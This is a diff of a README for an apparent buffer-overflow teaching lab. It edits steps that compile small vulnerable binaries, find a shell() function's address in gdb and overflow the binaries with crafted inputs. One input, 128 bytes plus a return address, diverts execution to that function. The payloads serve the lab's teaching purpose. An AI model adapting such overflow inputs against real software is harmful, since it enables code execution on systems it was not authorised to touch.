@@ -85,9 +85,9 @@ The Dockerfile is used to build docker image with full required packages for Han
 2. Open terminal<br>
 `$> cd seclabs` <br>
 `$> cd bof` <br>
-4. Overflow memory we need to fill 40 characters + 4 characters of variable check address <br>
-`$>echo $(python -c "print('a'*40+'\xff\xff\xff\xff')") | ./bof2.out` <br>
-![image](https://github.com/user-attachments/assets/548b9b77-c695-48af-9e64-7334b3b7626d)
+4. If you want print out this statement printf("Congration") <br>
+`$>echo $(python -c "print('a'*90)") | ./bof3.out` <br>
+![image](https://github.com/user-attachments/assets/96b54264-7179-46a4-a9ce-463989c2357c)
 5. Run code command. to open visual studio in terminal <br>
 6. Run docker container from previously built image <br>
 7. Run this command to create file bof1.out<br>
@@ -98,9 +98,9 @@ The Dockerfile is used to build docker image with full required packages for Han
 `$> gdb -q bof3.out` <br>
 10. Get the shell function address <br>
 `$> disas shell` <br>
-11. Else print out this statement printf("Yeah! You win!\n") <br>
-`$>echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out` <br>
-![image](https://github.com/user-attachments/assets/738be82f-7ceb-487d-9b3b-2a985bde5b0f)
+![image](https://github.com/user-attachments/assets/b52f5476-56e8-4205-8f8a-c3883ccd9be9)
+11. If you want print out this statement printf("You made it! The shell() function is executed\n") <br>
+`$>echo $(python -c "print('a'*128+'\x5b\x84\x04\x08')") | ./bof3.out` <br>
 
 
 
